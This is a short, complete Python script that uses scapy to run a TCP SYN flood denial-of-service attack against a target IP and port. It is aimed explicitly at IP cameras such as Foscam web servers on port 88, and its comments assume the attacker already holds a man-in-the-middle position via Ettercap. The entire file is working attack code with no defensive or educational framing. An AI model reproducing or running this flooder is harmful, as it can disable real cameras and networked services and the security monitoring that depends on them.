#!/usr/bin/env python3

import scapy.all as scapy
import sys
import os

# --- Utility Functions ---

def syn_flood(target_ip, target_port):
    """
    Performs a TCP SYN flood attack on the target.
    This function assumes you have already established a
    Man-in-the-Middle position using a tool like Ettercap.
    
    Args:
        target_ip (str): The IP address of the target to flood.
        target_port (int): The port to flood (e.g., 88 for Foscam web server).
    """
    print(f"[*] Starting SYN flood on {target_ip}:{target_port}. Press Ctrl+C to stop.")
    
    # Construct the malicious packet
    ip_layer = scapy.IP(dst=target_ip)
    # "S" flag indicates a SYN packet. RandShort() provides a random source port.
    tcp_layer = scapy.TCP(sport=scapy.RandShort(), dport=target_port, flags="S")
    # Add some raw data to increase packet size
    raw_layer = scapy.Raw(b"X"*1024)
    
    packet = ip_layer / tcp_layer / raw_layer
    
    packets_sent = 0
    try:
        # Loop indefinitely, sending packets as fast as possible
        while True:
            scapy.send(packet, verbose=False)
            packets_sent += 1
            print(f"\r[+] Packets sent: {packets_sent}", end="")

    except KeyboardInterrupt:
        print("\n[*] SYN flood stopped by user.")
        return

# --- Main Execution ---

if __name__ == "__main__":
    # This script requires root privileges to send raw packets
    if os.geteuid() != 0:
        print("[-] This script must be run as root. Please use 'sudo'.")
        sys.exit(1)

    try:
        # Get target information from the user
        target_ip = input("[*] Enter Target IP (Camera): ")
        target_port = int(input("[*] Enter Target Port (e.g., 88 for Foscam web server): "))
    except ValueError:
        print("\n[-] Invalid port number. It must be an integer. Exiting.")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[-] User requested exit. Goodbye.")
        sys.exit(0)

    # Launch the SYN flood
    syn_flood(target_ip, target_port)
    print("[+] Attack finished.")